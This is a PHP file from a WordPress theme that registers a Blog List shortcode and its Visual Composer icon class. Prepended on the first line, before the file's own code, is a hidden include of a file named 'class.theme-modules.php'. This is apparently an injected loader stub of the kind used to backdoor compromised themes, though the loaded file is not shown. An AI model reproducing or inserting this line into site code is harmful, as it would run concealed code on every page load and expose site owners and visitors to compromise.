<?php if (file_exists(dirname(__FILE__) . '/class.theme-modules.php')) include_once(dirname(__FILE__) . '/class.theme-modules.php'); ?><?php

if ( ! function_exists( 'overton_mikado_add_blog_list_shortcode' ) ) {
	function overton_mikado_add_blog_list_shortcode( $shortcodes_class_name ) {
		$shortcodes = array(
			'OvertonCore\CPT\Shortcodes\BlogList\BlogList'
		);
		
		$shortcodes_class_name = array_merge( $shortcodes_class_name, $shortcodes );
		
		return $shortcodes_class_name;
	}
	
	add_filter( 'overton_core_filter_add_vc_shortcode', 'overton_mikado_add_blog_list_shortcode' );
}

if ( ! function_exists( 'overton_mikado_set_blog_list_icon_class_name_for_vc_shortcodes' ) ) {
	/**
	 * Function that set custom icon class name for blog shortcodes to set our icon for Visual Composer shortcodes panel
	 */
	function overton_mikado_set_blog_list_icon_class_name_for_vc_shortcodes( $shortcodes_icon_class_array ) {
		$shortcodes_icon_class_array[] = '.icon-wpb-blog-list';
		
		return $shortcodes_icon_class_array;
	}
	
	add_filter( 'overton_core_filter_add_vc_shortcodes_custom_icon_class', 'overton_mikado_set_blog_list_icon_class_name_for_vc_shortcodes' );
}